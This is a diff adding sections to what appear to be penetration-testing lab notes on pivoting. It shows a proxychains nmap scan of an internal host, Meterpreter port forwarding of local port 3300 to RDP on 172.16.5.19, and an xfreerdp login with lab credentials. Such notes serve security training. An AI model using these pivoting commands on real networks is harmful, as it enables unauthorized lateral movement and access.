@@ -88,3 +88,20 @@ meterpreter > run autoroute -p
 ```
 
 
+#### Testing Proxy & Routing Functionality
+```
+proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+```
+
+## Port Forwarding
+#### Creating Local TCP Relay
+```bash
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+```
+- The above command  requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session.
+
+#### Connecting to Windows Target (via RDP) through localhost
+```
+xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+
